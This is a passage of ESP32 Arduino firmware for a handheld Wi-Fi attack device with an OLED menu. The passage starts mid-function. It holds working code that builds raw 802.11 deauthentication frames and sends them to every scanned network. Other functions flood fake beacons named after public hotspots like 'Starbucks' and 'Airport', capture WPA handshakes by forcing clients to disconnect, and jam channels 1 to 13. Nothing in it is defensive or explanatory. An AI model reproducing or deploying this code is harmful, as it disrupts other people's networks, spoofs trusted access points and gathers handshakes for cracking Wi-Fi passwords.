        networkNames[i] = WiFi.SSID(i);
        if (networkNames[i].length() == 0) networkNames[i] = "<Hidden>";
        networkChannel[i] = WiFi.channel(i);
        memcpy(networkBSSID[i], WiFi.BSSID(i), 6);
    }
    char buf[32]; sprintf(buf, "Found: %d", networkCount);
    showMessage(buf, 1500);
    WiFi.mode(WIFI_AP_STA);
}
void sendDeauth(uint8_t* bssid, uint8_t* client, int ch) {
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    uint8_t p[26] = {0xC0,0x00,0x00,0x00, client[0],client[1],client[2],client[3],client[4],client[5],
        bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
        bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5], 0x00,0x00,0x07,0x00};
    esp_wifi_80211_tx(WIFI_IF_STA, p, 26, false);
    deauthPackets++;
}
void startDeauth() {
    if (networkCount == 0) { showMessage("SCAN first!", 1000); return; }
    deauthActive = true; deauthPackets = 0;
    showMessage("DEAUTH started", 1000);
    uint8_t broadcast[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    while (deauthActive) {
        for (int i = 0; i < networkCount && deauthActive; i++) {
            sendDeauth(networkBSSID[i], broadcast, networkChannel[i]);
        }
        if (checkButton(BTN_BACK)) deauthActive = false;
        delay(10);
    }
    showMessage("DEAUTH stopped", 1000);
}
void stopDeauth() { deauthActive = false; }
void startBeacon() {
    beaconActive = true; beaconPackets = 0;
    const char* ssids[] = {"FREE_WIFI","Starbucks","Airport","Metro","Public"};
    showMessage("BEACON started", 1000);
    while (beaconActive) {
        for (int s = 0; s < 5 && beaconActive; s++) {
            uint8_t bssid[6];
            for (int i = 0; i < 6; i++) bssid[i] = random(256);
            bssid[0] |= 0x02;
            uint8_t p[200]; int len = 0;
            p[len++] = 0x80; p[len++] = 0x00; p[len++] = 0x00; p[len++] = 0x00;
            for (int i = 0; i < 6; i++) p[len++] = 0xFF;
            for (int i = 0; i < 6; i++) p[len++] = bssid[i];
            for (int i = 0; i < 6; i++) p[len++] = bssid[i];
            p[len++] = 0x00; p[len++] = 0x00;
            for (int i = 0; i < 8; i++) p[len++] = 0x00;
            p[len++] = 0x64; p[len++] = 0x00; p[len++] = 0x11; p[len++] = 0x00;
            p[len++] = 0x00; p[len++] = strlen(ssids[s]);
            for (int i = 0; i < (int)strlen(ssids[s]); i++) p[len++] = ssids[s][i];
            esp_wifi_80211_tx(WIFI_IF_STA, p, len, false);
            beaconPackets++;
        }
        if (checkButton(BTN_BACK)) beaconActive = false;
        delay(30);
    }
}
void stopBeacon() { beaconActive = false; }
void handshakeCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!handshakeActive) return;
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    int len = pkt->rx_ctrl.sig_len;
    uint8_t* payload = pkt->payload;
    if (len < 30) return;
    for (int i = 0; i < len - 8; i++) {
        if (payload[i] == 0x88 && payload[i+1] == 0x8E) {
            eapolCount++;
            handshakes += "[HANDSHAKE] " + currentTarget + "\\n";
            saveData();
            showMessage("HANDSHAKE CAPTURED!", 2000);
            handshakeActive = false;
            return;
        }
    }
}
void startHandshake() {
    if (networkCount == 0) { showMessage("SCAN first!", 1000); return; }
    int target = 0;
    while (true) {
        u8g2.clearBuffer(); drawTopBar(); u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(5, 15, "Select AP:");
        for (int i = 0; i < min(networkCount, 5); i++) {
            if (i == target) u8g2.drawStr(5, 30 + i * 8, ">");
            u8g2.drawStr(20, 30 + i * 8, networkNames[i].substring(0, 12).c_str());
        }
        u8g2.drawStr(5, 60, "OK-start BACK"); u8g2.sendBuffer();
        if (checkButton(BTN_UP) && target > 0) target--;
        else if (checkButton(BTN_DOWN) && target < min(networkCount, 5) - 1) target++;
        else if (checkButton(BTN_OK)) break;
        else if (checkButton(BTN_BACK)) return;
        delay(50);
    }
    currentTarget = networkNames[target];
    esp_wifi_set_channel(networkChannel[target], WIFI_SECOND_CHAN_NONE);
    handshakeActive = true; eapolCount = 0;
    showMessage("Capturing... 30s", 1500);
    unsigned long start = millis();
    uint8_t broadcast[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    while (handshakeActive && millis() - start < 30000) {
        sendDeauth(networkBSSID[target], broadcast, networkChannel[target]);
        delay(100);
    }
    handshakeActive = false;
    if (eapolCount > 0) showMessage("HANDSHAKE saved!", 1500);
    else showMessage("Failed", 1500);
}
void startJammer() {
    showMessage("WIFI JAMMER started", 1000);
    for (int i = 0; i < 500; i++) {
        for (int ch = 1; ch <= 13; ch++) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            uint8_t p[128];
            for (int j = 0; j < 10; j++) esp_wifi_80211_tx(WIFI_IF_STA, p, sizeof(p), false);
        }
        if (checkButton(BTN_BACK)) break;
        delay(10);
    }
    showMessage("JAMMER stopped", 1000);
}
